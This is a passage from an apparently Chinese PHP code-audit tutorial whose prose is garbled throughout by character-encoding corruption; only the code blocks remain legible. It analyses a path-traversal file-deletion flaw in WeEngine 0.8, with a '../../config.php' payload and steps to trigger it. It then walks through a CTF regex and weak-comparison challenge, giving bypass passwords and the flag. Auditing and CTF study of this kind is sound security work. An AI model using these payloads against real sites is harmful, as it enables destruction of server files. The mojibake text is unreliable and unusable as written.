ï¼š</p><p>è¿™ä¸€å…³è€ƒå¯Ÿçš„å†…å®¹æ˜¯ç”±æ­£åˆ™è¡¨è¾¾å¼ä¸ä¸¥è°¨å¯¼è‡´çš„ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´ï¼Œ å¯¼è‡´è¿™ä¸€æ¼æ´çš„åŸå› åœ¨ <strong>ç¬¬19è¡Œ</strong> ï¼Œ <strong>preg_replace</strong> ä¸­çš„ <strong>pattern</strong> éƒ¨åˆ† ï¼Œè¯¥æ­£åˆ™è¡¨è¾¾å¼å¹¶æœªèµ·åˆ°è¿‡æ»¤ç›®å½•è·¯å¾„å­—ç¬¦çš„ä½œç”¨ã€‚<code>[^a-z.-_]</code>  è¡¨ç¤ºåŒ¹é…é™¤äº† <strong>a</strong> å­—ç¬¦åˆ° <strong>z</strong> å­—ç¬¦ã€**.** å­—ç¬¦åˆ° <strong>_</strong> å­—ç¬¦ä¹‹é—´çš„æ‰€æœ‰å­—ç¬¦ã€‚å› æ­¤ï¼Œæ”»å‡»è€…è¿˜æ˜¯å¯ä»¥ä½¿ç”¨ç‚¹å’Œæ–œæ ç¬¦å·è¿›è¡Œè·¯å¾„ç©¿è¶Šï¼Œæœ€ç»ˆåˆ é™¤ä»»æ„æ–‡ä»¶ï¼Œä¾‹å¦‚ä½¿ç”¨ <strong>payload</strong> ï¼š <code>action = deleteï¼†data = ../../ config.php</code>ï¼Œä¾¿å¯åˆ é™¤ <strong>config.php</strong> æ–‡ä»¶ã€‚</p><blockquote><p><a href="http://php.net/manual/zh/function.preg-replace.php"><strong>preg_replace</strong></a>ï¼š(PHP 4, PHP 5, PHP 7)</p><p><strong>åŠŸèƒ½</strong> ï¼š å‡½æ•°æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢</p><p><strong>å®šä¹‰</strong> ï¼š <code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code></p><p>æœç´¢ <strong>subject</strong> ä¸­åŒ¹é… <strong>pattern</strong> çš„éƒ¨åˆ†ï¼Œ å¦‚æœåŒ¹é…æˆåŠŸå°†å…¶æ›¿æ¢æˆ <strong>replacement</strong> ã€‚</p></blockquote><h3 id="å®ä¾‹åˆ†æ-1"><a href="#å®ä¾‹åˆ†æ-1" class="headerlink" title="å®ä¾‹åˆ†æ"></a>å®ä¾‹åˆ†æ</h3><p>æœ¬æ¬¡å®ä¾‹åˆ†æï¼Œæˆ‘ä»¬é€‰å–çš„æ˜¯ <strong>WeEngine0.8</strong> ç‰ˆæœ¬ã€‚æ¼æ´å…¥å£æ–‡ä»¶ä¸º <strong>web&#x2F;source&#x2F;site&#x2F;category.ctrl.php</strong> ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸‹å›¾ <strong>14è¡Œ</strong> å¤„è°ƒç”¨äº† <strong>file_delete</strong> å‡½æ•°ï¼Œè€Œè¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶åˆ é™¤ç›¸å…³æ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹è¯¥å‡½æ•°çš„å…·ä½“å®šä¹‰ã€‚ä¸‹å›¾æ˜¯å…¥å£æ–‡ä»¶ä»£ç ï¼š</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-26.png"></p><p> <strong>file_delete</strong> è¿™ä¸€å‡½æ•°å¯ä»¥åœ¨ <strong>framework&#x2F;function&#x2F;file.func.php</strong> æ–‡ä»¶ä¸­æ‰¾åˆ°ï¼Œè¯¥æ–¹æ³•åŠŸèƒ½ç”¨äºæ£€æµ‹æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™åˆ é™¤æ–‡ä»¶ã€‚ä½†æ˜¯æŸ¥çœ‹ä¸Šä¸‹æ–‡å‘ç°ï¼Œç¨‹åºå¹¶æ²¡æœ‰å¯¹æ–‡ä»¶å <strong>$file</strong> å˜é‡è¿›è¡Œè¿‡æ»¤ï¼Œæ‰€ä»¥æ–‡ä»¶åå°±å¯ä»¥å­˜åœ¨ç±»ä¼¼ <strong>..&#x2F;</strong> è¿™ç§å­—ç¬¦ï¼Œè¿™æ ·ä¹Ÿå°±å¼•å‘ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´ï¼Œ<strong>file_delete</strong> å‡½æ•°ä»£ç å¦‚ä¸‹ï¼š</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-27.png"></p><p>ç°åœ¨æˆ‘ä»¬åœ¨å›æº¯å›å»ï¼Œçœ‹çœ‹ <strong>$file</strong> å˜é‡ä»ä½•å¤„æ¥ã€‚å®é™…ä¸Šï¼Œä¸Šå›¾çš„ <strong>$file</strong> å˜é‡å¯¹åº”çš„æ˜¯ <strong>$row[â€˜iconâ€™]</strong> çš„å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶ <strong>$row[â€˜iconâ€™]</strong> çš„å€¼ï¼Œå°±å¯ä»¥åˆ é™¤ä»»æ„æ–‡ä»¶ã€‚é‚£ä¹ˆæˆ‘ä»¬æ¥çœ‹çœ‹ <strong>$row</strong> å˜é‡ä»ä½•è€Œæ¥ã€‚è¯¥å˜é‡å°±åœ¨æˆ‘ä»¬åˆšåˆšåˆ†æçš„ç¬¬ä¸€å¼ å›¾ç‰‡ä¸­( <strong>web&#x2F;source&#x2F;site&#x2F;category.ctrl.php</strong> æ–‡ä»¶)ï¼Œè¯¥å€¼ä¸ºå˜é‡ <strong>$navs</strong> ä¸­çš„å…ƒç´ å€¼ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-28.png"></p><p>æˆ‘ä»¬å†å¾€ä¸Šçœ‹ï¼Œå³å¯æ‰¾åˆ° <strong>$navs</strong> å˜é‡çš„å–å€¼æƒ…å†µã€‚å¯ä»¥çœ‹åˆ° <strong>$navs</strong> å˜é‡çš„æ˜¯ä»æ•°æ®åº“ <strong>site_nav</strong> è¡¨ä¸­å–å‡ºçš„ï¼ŒåŒ…å«äº† <strong>icon</strong> å’Œ <strong>id</strong> ä¸¤ä¸ªå­—æ®µï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$navs</span> = <span class="title function_ invoke__">pdo_fetchall</span>(<span class="string">&quot;SELECT icon, id FROM &quot;</span>.<span class="title function_ invoke__">tablename</span>(<span class="string">&#x27;site_nav&#x27;</span>).<span class="string">&quot; WHERE id IN (SELECT nid FROM &quot;</span>.<span class="title function_ invoke__">tablename</span>(<span class="string">&#x27;site_category&#x27;</span>).<span class="string">&quot; WHERE id = <span class="subst">&#123;$id&#125;</span> OR parentid = &#x27;<span class="subst">$id</span>&#x27;)&quot;</span>, <span class="keyword">array</span>(), <span class="string">&#x27;id&#x27;</span>);</span><br></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬è¦åšçš„ï¼Œå°±æ˜¯æ‰¾æ‰¾çœ‹æ•°æ®åº“ä¸­çš„è¿™ä¸¤ä¸ªå­—æ®µæ˜¯å¦å¯ä»¥è¢«ç”¨æˆ·æ§åˆ¶ã€‚æˆ‘ä»¬ç»§ç»­å¾€å‰æŸ¥æ‰¾ï¼Œå‘ç°äº†å¦‚ä¸‹ä»£ç ï¼š<img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-29.png"></p><p><strong>site_nav</strong> è¡¨ä¸­çš„æ•°æ®ï¼Œå¯¹åº”çš„æ˜¯ <strong>$nav</strong> å˜é‡ã€‚æˆ‘ä»¬ç»§ç»­å¾€ä¸Šå¯»æ‰¾ <strong>$nav</strong> å˜é‡ï¼Œå‘ç° <strong>$nav[â€˜iconâ€™]</strong> å˜é‡æ˜¯ä» <strong>$_GPC[â€˜iconfileâ€™]</strong> æ¥çš„ï¼Œå³å¯è¢«ç”¨æˆ·æ§åˆ¶( ä¸‹å›¾ <strong>ç¬¬21è¡Œ</strong> )ã€‚è¿™é‡Œçš„ <strong>$nav[â€˜iconâ€™]</strong> å˜é‡ï¼Œå…¶å®å°±æ˜¯æˆ‘ä»¬æ–‡ç« å¼€å¤´åˆ†æçš„ä¼ å…¥ <strong>file_delete</strong> å‡½æ•°çš„å‚æ•°ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-30.png"></p><p>ç”±äº <strong>$nav[â€˜iconâ€™]</strong> å˜é‡å¯è¢«ç”¨æˆ·æ§åˆ¶ï¼Œç¨‹åºæœ‰æ²¡æœ‰å¯¹å…¶è¿›è¡Œæ¶ˆæ¯’å¤„ç†ï¼Œç›´æ¥å°±ä¼ å…¥äº† <strong>file_delete</strong> å‡½æ•°ï¼Œæœ€ç»ˆå¯¼è‡´äº†æ–‡ä»¶åˆ é™¤æ¼æ´ã€‚è‡³æ­¤ï¼Œæˆ‘ä»¬åˆ†æå®Œäº†æ•´ä¸ªæ¼æ´çš„å‘ç”Ÿè¿‡ç¨‹ï¼Œæ¥ä¸‹çœ‹çœ‹å¦‚ä½•è¿›è¡Œæ”»å‡»ã€‚</p><h3 id="æ¼æ´éªŒè¯"><a href="#æ¼æ´éªŒè¯" class="headerlink" title="æ¼æ´éªŒè¯"></a>æ¼æ´éªŒè¯</h3><p>è®¿é—®urlï¼š<a href="http://xxx.xxx.xxx.xxx/WeEngine/web/index.php?c=account&a=display">http://xxx.xxx.xxx.xxx/WeEngine/web/index.php?c=account&amp;a=display</a> ï¼Œç‚¹å‡»ç®¡ç†å…¬ä¼—å·ï¼š</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-31.png"></p><p>æ‰¾åˆ°åˆ†ç±»è®¾ç½®ï¼Œç‚¹å‡»æ·»åŠ æ–‡ç« åˆ†ç±»ã€‚è¿™é‡Œå¯¹åº”çš„urlä¸ºï¼š<a href="http://xxx.xxx.xxx.xxx/WeEngine/web/index.php?c=site&a=category%EF%BC%8C%E5%AE%9E%E9%99%85%E4%B8%8A%E8%A1%A8%E7%A4%BA">http://xxx.xxx.xxx.xxx/WeEngine/web/index.php?c=site&amp;a=categoryï¼Œå®é™…ä¸Šè¡¨ç¤º</a> <strong>site</strong> æ§åˆ¶å™¨çš„ <strong>category</strong> æ¨¡å—ï¼Œå³å¯¹åº” <strong>category.ctrl.php</strong> æ–‡ä»¶ã€‚</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-32.png"></p><p>é€‰æ‹©å¯¹åº”çš„å†…å®¹ï¼Œè¿›å…¥ <strong>if($isnav)</strong> åˆ¤æ–­ï¼š</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-33.png"></p><p>åœ¨ä¸Šä¼ å›¾æ ‡ä½ç½®è¾“å…¥è¦åˆ é™¤æ–‡ä»¶çš„è·¯å¾„</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-34.png"></p><p>æˆ‘ä»¬å»ºç«‹ <strong>delete.txt</strong> æ–‡ä»¶ï¼Œç”¨äºæµ‹è¯•ä»»æ„æ–‡ä»¶åˆ é™¤ï¼š</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-35.png"></p><p>æˆ‘ä»¬ç‚¹å‡»åˆ é™¤æ—¶ï¼Œå°±ä¼šè°ƒç”¨ <strong>file_delete</strong> å‡½æ•°ï¼ŒåŒæ—¶å°±ä¼šåˆ é™¤æ‰æˆ‘ä»¬æ’å…¥åˆ°æ•°æ®åº“ä¸­çš„å›¾ç‰‡åï¼š</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-36.png"></p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-37.png"></p><p>è¿™ä¸ªç±»å‹ä»»æ„æ–‡ä»¶åˆ é™¤æœ‰ç‚¹ç±»ä¼¼äºäºŒæ¬¡æ³¨å…¥ï¼Œåœ¨æ·»åŠ åˆ†ç±»æ—¶å…ˆæŠŠè¦åˆ é™¤çš„æ–‡ä»¶åç§°æ’å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œç„¶åç‚¹å‡»åˆ é™¤åˆ†ç±»æ—¶ï¼Œä¼šä»æ•°æ®åº“ä¸­å–å‡ºè¦åˆ é™¤çš„æ–‡ä»¶åã€‚</p><h3 id="ä¿®å¤å»ºè®®-1"><a href="#ä¿®å¤å»ºè®®-1" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h3><p>æ¼æ´æ˜¯æ²¡æœ‰å¯¹ <code>$row[&#39;icon&#39;]</code> å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œå¯ä»¥å°†æ–‡ä»¶åå†…å®¹åŠ å…¥ç›®å½•é˜¶å±‚å­—ç¬¦ï¼Œé€ æˆä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åœ¨ä¼ å…¥çš„å‚æ•°ä¸­è¿‡æ»¤â€..&#x2F;â€œç­‰ç›®å½•é˜¶å±‚å­—ç¬¦ï¼Œé¿å…ç›®å½•ç©¿è¶Šï¼Œåˆ é™¤å…¶ä»–æ–‡ä»¶å¤¹ä¸‹æ–‡ä»¶ã€‚æˆ‘ä»¬åœ¨ä¿®å¤ä¸­å¯ä»¥è¿‡æ»¤æ‰ <code>$row[&#39;icon&#39;]</code> ä¸­çš„ç›®å½•ç©¿è¶Šå­—ç¬¦ï¼Œå¼•å…¥æˆ‘ä»¬è‡ªå®šä¹‰çš„ä¸€ä¸ªå‡½æ•° <code>checkstr</code> å‡½æ•°ã€‚åŒæ—¶ <code>$row[&#39;icon&#39;]</code> åªæ˜¯æ–‡ä»¶çš„åç§°ï¼Œå¹¶éæ˜¯ä¸€ä¸ªè·¯å¾„ï¼Œå› æ­¤è¿‡æ»¤å­—ç¬¦å¹¶ä¸ä¼šå½±å“åˆ°å®é™…åŠŸèƒ½ï¼Œå¯¹æ­¤ä¿®å¤æ„è§æˆ‘ä»¬æä¾›å¦‚ä¸‹ä»£ç ï¼š</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-38.png"></p><h3 id="é¢˜ç›®-1"><a href="#é¢˜ç›®-1" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>  (<span class="string">&quot;POST&quot;</span> == <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt;= <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[[:graph:]]&#123;12,&#125;$/&#x27;</span>, <span class="variable">$password</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Wrong Format&#x27;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">TRUE</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$reg</span> = <span class="string">&#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">6</span> &gt; <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$reg</span>, <span class="variable">$password</span>, <span class="variable">$arr</span>))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="variable">$c</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$ps</span> = <span class="keyword">array</span>(<span class="string">&#x27;punct&#x27;</span>, <span class="string">&#x27;digit&#x27;</span>, <span class="string">&#x27;upper&#x27;</span>, <span class="string">&#x27;lower&#x27;</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$ps</span> <span class="keyword">as</span> <span class="variable">$pt</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[[:<span class="subst">$pt</span>:]]+/&quot;</span>, <span class="variable">$password</span>))</span><br><span class="line">            <span class="variable">$c</span> += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$c</span> &lt; <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;42&quot;</span> == <span class="variable">$password</span>) <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&#x27;Wrong password&#x27;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$flag</span> = <span class="string">&quot;HRCTF&#123;Pr3g_R3plac3_1s_Int3r3sting&#125;&quot;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜ç›®å®é™…ä¸Šè€ƒå¯Ÿçš„æ˜¯å¤§å®¶æ˜¯å¦ç†Ÿæ‚‰PHPæ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ç±»ï¼Œå½“ç„¶è¿˜æ¶‰åŠåˆ°ä¸€äº›å¼±ç±»å‹æ¯”è¾ƒé—®é¢˜ã€‚å¤§å®¶å¯ä»¥å…ˆæŸ¥é˜…ä¸€ä¸‹PHPæ‰‹å†Œå¯¹è¿™äº›å­—ç¬¦ç±»çš„å®šä¹‰ï¼Œå…·ä½“å¯ç‚¹ <a href="http://php.net/manual/zh/regexp.reference.character-classes.php">è¿™é‡Œ</a> ã€‚</p><table><thead><tr><th><em>alnum</em></th><th>å­—æ¯å’Œæ•°å­—</th></tr></thead><tbody><tr><td><em>alpha</em></td><td>å­—æ¯</td></tr><tr><td><em>ascii</em></td><td>0 - 127çš„asciiå­—ç¬¦</td></tr><tr><td><em>blank</em></td><td>ç©ºæ ¼å’Œæ°´å¹³åˆ¶è¡¨ç¬¦</td></tr><tr><td><em>cntrl</em></td><td>æ§åˆ¶å­—ç¬¦</td></tr><tr><td><em>digit</em></td><td>åè¿›åˆ¶æ•°(same as \d)</td></tr><tr><td><em>graph</em></td><td>æ‰“å°å­—ç¬¦, ä¸åŒ…æ‹¬ç©ºæ ¼</td></tr><tr><td><em>lower</em></td><td>å°å†™å­—æ¯</td></tr><tr><td><em>print</em></td><td>æ‰“å°å­—ç¬¦,åŒ…å«ç©ºæ ¼</td></tr><tr><td><em>punct</em></td><td>æ‰“å°å­—ç¬¦, ä¸åŒ…æ‹¬å­—æ¯å’Œæ•°å­—</td></tr><tr><td><em>space</em></td><td>ç©ºç™½å­—ç¬¦ (æ¯”\så¤šå‚ç›´åˆ¶è¡¨ç¬¦)</td></tr><tr><td><em>upper</em></td><td>å¤§å†™å­—æ¯</td></tr><tr><td><em>word</em></td><td>å•è¯å­—ç¬¦(same as \w)</td></tr><tr><td><em>xdigit</em></td><td>åå…­è¿›åˆ¶æ•°å­—</td></tr></tbody></table><p>é¢˜ç›®ä¸­æ€»å…±æœ‰ä¸‰å¤„æ­£åˆ™åŒ¹é…ï¼Œæˆ‘ä»¬åˆ†åˆ«æ¥çœ‹ä¸€ä¸‹å…¶å¯¹åº”çš„å«ä¹‰ã€‚<br>ç¬¬ä¸€å¤„çš„æ­£åˆ™ <strong>&#x2F;^[[:graph:]]{12,}$&#x2F;</strong> ä¸ºï¼šåŒ¹é…åˆ°å¯æ‰“å°å­—ç¬¦12ä¸ªä»¥ä¸Š(åŒ…å«12)ï¼Œ<strong>^</strong> å·è¡¨ç¤ºå¿…é¡»ä»¥æŸç±»å­—ç¬¦å¼€å¤´ï¼Œ**$** å·è¡¨ç¤ºå¿…é¡»ä»¥æŸç±»å­—ç¬¦ç»“å°¾ã€‚</p><p>ç¬¬äºŒå¤„æ­£åˆ™è¡¨è¾¾å¼ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$reg</span> = <span class="string">&#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">6</span> &gt; <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$reg</span>, <span class="variable">$password</span>, <span class="variable">$arr</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>è¡¨ç¤ºå­—ç¬¦ä¸²ä¸­ï¼ŒæŠŠè¿ç»­çš„ç¬¦å·ã€æ•°å­—ã€å¤§å†™ã€å°å†™ï¼Œä½œä¸ºä¸€æ®µï¼Œè‡³å°‘åˆ†å…­æ®µï¼Œä¾‹å¦‚æˆ‘ä»¬è¾“å…¥ <strong>H0ng+Ri</strong> åˆ™åŒ¹é…åˆ°çš„å­ä¸²ä¸º <strong>H   0   ng   +   R   i</strong> ã€‚</p><p>ç¬¬ä¸‰å¤„çš„æ­£åˆ™è¡¨è¾¾å¼ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ps</span> = <span class="keyword">array</span>(<span class="string">&#x27;punct&#x27;</span>, <span class="string">&#x27;digit&#x27;</span>, <span class="string">&#x27;upper&#x27;</span>, <span class="string">&#x27;lower&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$ps</span> <span class="keyword">as</span> <span class="variable">$pt</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[[:<span class="subst">$pt</span>:]]+/&quot;</span>, <span class="variable">$password</span>))</span><br><span class="line">    <span class="variable">$c</span> += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$c</span> &lt; <span class="number">3</span>) <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>è¡¨ç¤ºä¸ºè¾“å…¥çš„å­—ç¬¦ä¸²è‡³å°‘å«æœ‰ç¬¦å·ã€æ•°å­—ã€å¤§å†™ã€å°å†™ä¸­çš„ä¸‰ç§ç±»å‹ã€‚ç„¶åé¢˜ç›®æœ€åå°† <strong>$password</strong> ä¸42è¿›è¡Œäº†å¼±æ¯”è¾ƒã€‚æ‰€ä»¥æˆ‘ä»¬çš„payloadä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=<span class="number">42.00e+00000</span></span><br><span class="line">password=<span class="number">420.00000e-1</span></span><br></pre></td></tr></table></figure><p>ç½‘ç»œä¸Šè¿˜æœ‰ä¸€ç§è§£æ³•æ˜¯ï¼š <strong>password&#x3D;\x34\x32\x2E</strong> ï¼Œä½†æ˜¯è¿™ç§è§£æ³•å¹¶ä¸å¯è¡Œï¼Œå¤§å®¶å¯ä»¥æ€è€ƒä¸€ä¸‹ä¸ºä»€ä¹ˆã€‚</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-39.png"></p><p>åœ¨ PHP ä¸­ï¼Œæäº¤å½¢å¦‚ <code>password=\x34\x32\x2E</code> çš„ payload æ˜¯ä¸å¯è¡Œçš„ï¼Œä¸»è¦å› ä¸ºè¿™ç§è¡¨è¾¾æ–¹å¼å¹¶ä¸ä¼šè¢« PHP ä»¥ä½ å¯èƒ½é¢„æœŸçš„æ–¹å¼è§£é‡Šã€‚</p><ol><li><strong>è§£ææ–¹å¼</strong>ï¼šåœ¨ PHP ä¸­ï¼Œå­—ç¬¦ä¸² <code>\x34\x32\x2E</code> ä¼šè¢«ç›´æ¥å½“ä½œæ™®é€šå­—ç¬¦ä¸²å¤„ç†ï¼Œè€Œä¸æ˜¯è§£é‡Šä¸ºå®ƒä»¬å¯¹åº”çš„ ASCII å­—ç¬¦ã€‚è¿™æ„å‘³ç€ <code>\x34</code> ä¸ä¼šè¢«è§£é‡Šä¸ºæ•°å­— â€œ4â€ï¼Œ<code>\x32</code> ä¸ä¼šè¢«è§£é‡Šä¸ºæ•°å­— â€œ2â€ï¼Œ<code>\x2E</code> ä¸ä¼šè¢«è§£é‡Šä¸ºç‚¹å· â€œ.â€ã€‚å› æ­¤ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å®é™…ä¸Šæ˜¯ç”± <code>\x34\x32\x2E</code> ç»„æˆçš„åŸå§‹æ–‡æœ¬ï¼Œè€Œä¸æ˜¯ä½ å¯èƒ½æœŸå¾…çš„ â€œ42.â€ã€‚</li><li><strong>æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…</strong>ï¼šå› ä¸ºå­—ç¬¦ä¸²æ˜¯æŒ‰åŸæ ·å¤„ç†çš„ï¼Œæ‰€ä»¥åœ¨ <code>preg_match(&#39;/^[[:graph:]]&#123;12,&#125;$/&#39;, $password)</code> è¿™ä¸€æ­¥ï¼Œæ£€æŸ¥å¯†ç æ˜¯å¦ç¬¦åˆè‡³å°‘12ä¸ªå¯æ‰“å°å­—ç¬¦çš„è§„åˆ™æ—¶ï¼Œ<code>\x34\x32\x2E</code> è¿™ä¸ªå­—ç¬¦ä¸²ä¸ä¼šæ»¡è¶³æ¡ä»¶ã€‚å³ä½¿å®ƒçš„é•¿åº¦å¯èƒ½è¶…è¿‡12ä¸ªå­—ç¬¦ï¼Œè¿™äº›å­—ç¬¦å¹¶ä¸å…¨éƒ¨æ˜¯å¯æ‰“å°å­—ç¬¦ã€‚</li><li><strong>ç±»å‹å¼±æ¯”è¾ƒ</strong>ï¼šå³ä¾¿è¿™ä¸ªå­—ç¬¦ä¸²èƒ½å¤Ÿé€šè¿‡å‰é¢çš„æ­£åˆ™è¡¨è¾¾å¼éªŒè¯ï¼ŒPHP åœ¨ä¸ â€œ42â€ è¿›è¡Œå¼±ç±»å‹æ¯”è¾ƒæ—¶ï¼Œä¹Ÿä¼šå°† <code>\x34\x32\x2E</code> è§†ä¸ºä¸€ä¸ªæ™®é€šå­—ç¬¦ä¸²ï¼Œè¿™å¹¶ä¸ä¼šè¢«è‡ªåŠ¨è½¬æ¢æˆæ•°å€¼ 42ã€‚PHP ä¸­çš„å¼±ç±»å‹æ¯”è¾ƒé€šå¸¸æ¶‰åŠåˆ°æ•°å­—å­—ç¬¦ä¸²å’Œæ•´æ•°ä¹‹é—´çš„æ¯”è¾ƒï¼Œä¾‹å¦‚ â€œ42â€ ä¸ 42 æˆ– â€œ42.0â€ ä¸ 42 ç­‰ï¼Œä½†ä¸ä¼šå°†åŒ…å«éæ•°å­—å­—ç¬¦çš„å­—ç¬¦ä¸²è§†ä¸ºæ•°å€¼ã€‚</li></ol><p>PSï¼šåœ¨ <a href="https://xz.aliyun.com/t/2523">ä»£ç å®¡è®¡Day6 - æ­£åˆ™ä½¿ç”¨ä¸å½“å¯¼è‡´çš„è·¯å¾„ç©¿è¶Šé—®é¢˜</a> çš„æ–‡ç« è¯„è®ºä¸‹é¢ï¼Œæˆ‘ä»¬æåŠäº†ä¸€ä¸ªç»å…¸çš„é€šè¿‡æ­£åˆ™å†™é…ç½®æ–‡ä»¶çš„æ¡ˆä¾‹ï¼Œè¿™ä¸ªæ¡ˆä¾‹å…·ä½“æ€ä¹ˆç»•è¿‡å¹¶å†™å…¥shellï¼Œå¤§å®¶å¯ä»¥å‚è€ƒ <a href="https://github.com/wonderkun/CTF_web/tree/dcf36cb9ba9a580a4e8d92b43480b6575fed2c3a/web200-7"> <strong>è¿™é‡Œ</strong> </a> ã€‚</p><h2 id="Bell"><a href="#Bell" class="headerlink" 